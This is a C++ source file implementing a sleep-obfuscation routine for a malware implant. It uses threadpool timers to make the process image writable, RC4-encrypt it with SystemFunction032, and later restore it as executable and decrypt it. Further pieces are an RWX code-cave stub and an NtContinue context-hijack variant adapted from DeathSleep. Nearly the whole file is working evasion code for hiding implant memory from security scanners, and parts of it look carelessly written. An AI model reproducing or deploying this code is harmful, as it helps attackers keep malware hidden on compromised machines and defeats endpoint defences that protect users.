#include <Windows.h>
#include <vector>

extern "C" {
VOID CALLBACK WorkCallback8(
                            DWORD64 na, 
                            PVOID Context
                           );
};

typedef struct DelayedArbitraryCallback
{
    uintptr_t Callback;
    DWORD64 a1;
    DWORD64 a2;
    DWORD64 a3;
    DWORD64 a4;
    DWORD64 a5;
    DWORD64 a6;
    DWORD64 a7;
    DWORD64 a8;
    UINT64 Timeout; // miliseconds
} * pTpTimerArbitraryCallback;

// this can technically be any operation
// the implant can perform while its actual
// RX memory is not available. 

class SleepRoutine
{
    public:
        INT8 args; // how many args can we supply?
                   // -1 for unlimited 

        virtual BOOL ScheduleArbitraryCallbacks (std::vector<DelayedArbitraryCallback> CBs) {return false;}
};

// THREADPOOL TIMER ROUTINE STUFF

// from 
// https://github.com/janoglezcampos/DeathSleep

#define InitializeCallbackInfo(ci, functionAddres, parameterAddres) \
    {                                                               \
        (ci)->timer = NULL;                                         \
        (ci)->isImpersonating = 0;                                  \
        (ci)->flags = 0;                                            \
        (ci)->callbackAddr = (WAITORTIMERCALLBACK)functionAddres;   \
        (ci)->paramAddr = parameterAddres;                          \
        (ci)->timerQueue = NULL;                                    \
        (ci)->isPeriodic = 0;                                       \
        (ci)->execControl = 0;                                      \
    }

#define InitializeFiletimeMs(ft, millis)                                                  \
    {                                                                                     \
        (ft)->dwHighDateTime = (DWORD)(((ULONGLONG) - ((millis)*10 * 1000)) >> 32);       \
        (ft)->dwLowDateTime  = (DWORD)(((ULONGLONG) - ((millis)*10 * 1000)) & 0xffffffff);\
    }

typedef struct
{                                     //      NOTE                REQUIRED
    PTP_TIMER timer;                  // 0     Timer                   X
    DWORD64 m2;                       // 8     NULL
    DWORD64 isImpersonating;          // 16    0                       X
    ULONG flags;                      // 24    Flags                   X
    DWORD32 m5;                       // 28    NULL
    WAITORTIMERCALLBACK callbackAddr; // 32    Callback Address        X
    PVOID paramAddr;                  // 40    Parameter Address       X
    DWORD32 m7;                       // 48    0
    DWORD32 m8;                       // 52    Padding
    HANDLE timerQueue;                // 56    NULL                    X
    DWORD64 m9;                       // 64    0
    DWORD64 m10;                      // 72    0
    DWORD64 m11;                      // 80    0
    DWORD32 isPeriodic;               // 88    0                       X
    DWORD32 execControl;              // 92    0                       X
} TpTimerCallbackInfo;

BOOL bCompare(const BYTE *pData, const BYTE *bMask, const char *szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
    {
        if (*szMask == 'x' && *pData != *bMask) {return FALSE;}
    }

    return TRUE;
}

DWORD_PTR findPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
    {
        if (bCompare((PBYTE)(dwAddress + i), bMask, szMask))
        {
            return (DWORD_PTR)(dwAddress + i);
        }
    }
    return 0;
}

DWORD_PTR findInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    PIMAGE_DOS_HEADER ImageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ImageBase + ImageBase->e_lfanew);
    DWORD_PTR section_offset = (DWORD_PTR)ImageBase + ImageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    PIMAGE_SECTION_HEADER text_section = (PIMAGE_SECTION_HEADER)(section_offset);
    DWORD_PTR dwAddress = findPattern((DWORD_PTR)ImageBase + text_section->VirtualAddress, text_section->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

// mine again

struct TimerSleepParamaters
{
    CONTEXT ctx;
    TpTimerCallbackInfo tpcb;
};

class ThreadpoolTimerSleepRoutine : SleepRoutine
{
    public:
        PTP_CALLBACK_ENVIRON TP;
        CONTEXT DummyThreadpoolCtx;

        uintptr_t pRtlpTpTimerCallback;
        uintptr_t pNtContinue;

        std::vector<TimerSleepParamaters*> RoutineContexts;

        ThreadpoolTimerSleepRoutine(
                                    PTP_CALLBACK_ENVIRON tp, 
                                    uintptr_t _pRtlpTpTimerCallback,
                                    uintptr_t _pNtContinue
                                   )
          : TP (tp)
          , pRtlpTpTimerCallback (_pRtlpTpTimerCallback)
          , pNtContinue (_pNtContinue)
        {
            args = 4;

            TpTimerCallbackInfo tpcb;
            InitializeCallbackInfo(&tpcb, RtlCaptureContext, &DummyThreadpoolCtx);
            tpcb.timer = CreateThreadpoolTimer(
                (PTP_TIMER_CALLBACK)pRtlpTpTimerCallback,
                &tpcb,
                tp
            );

            FILETIME T;
            InitializeFiletimeMs(&T, 0);
            SetThreadpoolTimer(tpcb.timer, &T, 0, 0);
            Sleep(32);
            DummyThreadpoolCtx.Rsp -= 8;
        }

        BOOL ScheduleArbitraryCallbacks (std::vector<DelayedArbitraryCallback> CBs) override
        {
            for (auto CB : CBs)
            {
                if(CB.a5 || CB.a6 || CB.a7 || CB.a8)
                    return false;

                FILETIME dueTimeHolder;
                InitializeFiletimeMs(&dueTimeHolder, CB.Timeout);

                if(CB.a1 && !CB.a2 && !CB.a3 && !CB.a4)
                {
                    TimerSleepParamaters* P = new TimerSleepParamaters;
                    RoutineContexts.emplace_back(P);

                    InitializeCallbackInfo(&P->tpcb, CB.Callback, (PVOID)CB.a1);
                    P->tpcb.timer = CreateThreadpoolTimer(
                        (PTP_TIMER_CALLBACK)pRtlpTpTimerCallback,
                        &P->tpcb,
                        TP
                    );

                    printf("SET TIMER (1 arg)\n");
                    SetThreadpoolTimer(P->tpcb.timer, &dueTimeHolder, 0, 0);
                    continue;
                }

                else if(!CB.a1)
                {
                    PTP_TIMER T = CreateThreadpoolTimer(
                        (PTP_TIMER_CALLBACK)CB.Callback,
                        nullptr,
                        TP
                    );

                    printf("SET TIMER\n");
                    SetThreadpoolTimer(T, &dueTimeHolder, 0, 0);
                    continue;
                }

                TimerSleepParamaters* P = new TimerSleepParamaters;
                RoutineContexts.emplace_back(P);
                memcpy(&P->ctx, &DummyThreadpoolCtx, sizeof(CONTEXT));

                P->ctx.Rip = (DWORD64) CB.Callback;
                
                P->ctx.Rcx = (DWORD64) CB.a1;
                P->ctx.Rdx = (DWORD64) CB.a2;
                P->ctx.R8  = (DWORD64) CB.a3;
                P->ctx.R9  = (DWORD64) CB.a4;

                InitializeCallbackInfo(&P->tpcb, pNtContinue, &P->ctx);
                P->tpcb.timer = CreateThreadpoolTimer(
                    (PTP_TIMER_CALLBACK)pRtlpTpTimerCallback,
                    &P->tpcb,
                    TP
                );

                printf("SET TIMER\n");
                SetThreadpoolTimer(P->tpcb.timer, &dueTimeHolder, 0, 0);
            }
        }
};

// RWX CALLBACK-CAVE DLL SLEEP

// I WON'T CALL IT MOCKINGJAY... AHHHHHH
// I WON'T DO IT.

class RWXSleepRoutine : SleepRoutine
{
    public:

        PTP_CALLBACK_ENVIRON TP;
        uintptr_t codeCave;
        std::vector<DelayedArbitraryCallback*> callbacks;

        RWXSleepRoutine(
                        PTP_CALLBACK_ENVIRON tp,
                        uintptr_t CodeCave
                       )
          : TP (tp)
          , codeCave (CodeCave)
        {
            args = 8;
            memcpy((void *)codeCave, (void*)WorkCallback8, 58);
        }

        BOOL ScheduleArbitraryCallbacks (std::vector<DelayedArbitraryCallback> CBs) override
        {
            for (auto CB : CBs)
            {
                FILETIME dueTimeHolder;
                InitializeFiletimeMs(&dueTimeHolder, CB.Timeout);

                DelayedArbitraryCallback* callback = new DelayedArbitraryCallback; 
                *callback = CB;
                callbacks.emplace_back(callback); 

                PTP_TIMER T = CreateThreadpoolTimer(
                    (PTP_TIMER_CALLBACK)codeCave,
                    callback,
                    TP
                );

                printf("SET TIMER\n");
                SetThreadpoolTimer(T, &dueTimeHolder, 0, 0);
            }

            return true;
        }
};

// void cleanup(ThreadpoolTimerSleepRoutine* TimerSleep);
void cleanup(RWXSleepRoutine* RWXSleep);

BOOL init = false;
uintptr_t ntContinue;
uintptr_t RtlpTpTimerCallback;
uintptr_t systemfunc032;

HMODULE ImageBase;
DWORD ImageSize;

struct USTRING
{
   DWORD	Length;
   DWORD	MaximumLength;
   PVOID	Buffer;
};

char * keybuf;
USTRING* Key;
USTRING* Img;

DWORD OldProtect;

int main () 
{
    printf("HEARTBEAT\n");

    if (!init)
    {
        Img = new USTRING;
        ImageBase  = GetModuleHandle(NULL);
        Img->Buffer = ImageBase;
        
        PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(ImageBase);
        DWORD ntHeaderOffset = pDosHeader->e_lfanew;
        PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(ImageBase) + ntHeaderOffset);
        ImageSize = pNtHeaders->OptionalHeader.SizeOfImage;

        Img->Length = Img->MaximumLength = ImageSize;

        systemfunc032 = (uintptr_t) GetProcAddress(
            LoadLibraryA("Advapi32"),  
            "SystemFunction032"
        );

        // RtlpTpTimerCallback = (uintptr_t) findInModule("Ntdll",
        //     (PBYTE)"\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x18\x57\x48\x83\xec\x40\x48\x8b\xda\x80\x7a\x58\x00\x0f\x84",
        //     "xxxxxxxxxxxxxxxxxxxxxxxx"
        // );

        // ntContinue = (uintptr_t) GetProcAddress(
        //     GetModuleHandle("ntdll.dll"),
        //     "NtContinue"
        // );

        init = true;
    }

    Key = new USTRING;
    keybuf = new char[16];
    for (int i = 0; i < 15; i++) {keybuf[i] = rand() % 256;}

    Key->Buffer = keybuf;
    Key->Length = Key->MaximumLength = 16;

    // simulate RWX section.

    BYTE * codecave = new BYTE [58];
    VirtualProtect(codecave, 58, PAGE_EXECUTE_READWRITE, &OldProtect);

    RWXSleepRoutine* sleepmask = new RWXSleepRoutine (
        (PTP_CALLBACK_ENVIRON)nullptr, 
        (uintptr_t)codecave
    );

    // ThreadpoolTimerSleepRoutine* sleepmask = new ThreadpoolTimerSleepRoutine(
    //     (PTP_CALLBACK_ENVIRON) nullptr,
    //     RtlpTpTimerCallback,
    //     ntContinue
    // );

    #define msPeriod 10000

    std::vector<DelayedArbitraryCallback> routines {{0}, {0}, {0}, {0}, {0}};
    routines[0].Callback = (uintptr_t) VirtualProtect;
    routines[0].Timeout  = 200;
    routines[0].a1 = (DWORD64) ImageBase;
    routines[0].a2 = (DWORD64) ImageSize;
    routines[0].a3 = (DWORD64) PAGE_READWRITE;
    routines[0].a4 = (DWORD64) &OldProtect;

    routines[1].Callback = (uintptr_t)systemfunc032;
    routines[1].Timeout  = 300;
    routines[1].a1 = (DWORD64)Img;
    routines[1].a2 = (DWORD64)Key;

    routines[2].Callback = (uintptr_t) VirtualProtect;
    routines[2].Timeout  = msPeriod;
    routines[2].a1 = (DWORD64) ImageBase;
    routines[2].a2 = (DWORD64) ImageSize;
    routines[2].a3 = (DWORD64) PAGE_EXECUTE_READWRITE; // lazy........ bad
    routines[2].a4 = (DWORD64) &OldProtect;

    routines[3].Callback = (uintptr_t)systemfunc032;
    routines[3].Timeout  = msPeriod + 100;
    routines[3].a1 = (DWORD64)Img;
    routines[3].a2 = (DWORD64)Key;

    routines[4].Callback = (uintptr_t)cleanup;
    routines[4].Timeout  = msPeriod + 300;
    routines[4].a1 = (DWORD64)sleepmask;

    sleepmask->ScheduleArbitraryCallbacks(routines);

    Sleep(msPeriod + 500);
    printf("WAKING UP\n");
    return main();
}

void cleanup(RWXSleepRoutine* RWXSleep)
{
    printf("CALLED CLEANUP\n");
    delete RWXSleep;
    delete Key;
    delete [16] keybuf;
}

// void cleanup(ThreadpoolTimerSleepRoutine* TimerSleep)
// {
//     printf("CALLED CLEANUP\n");
//     delete TimerSleep;
//     delete Key;
//     delete [16] keybuf;
//     // main();
// }
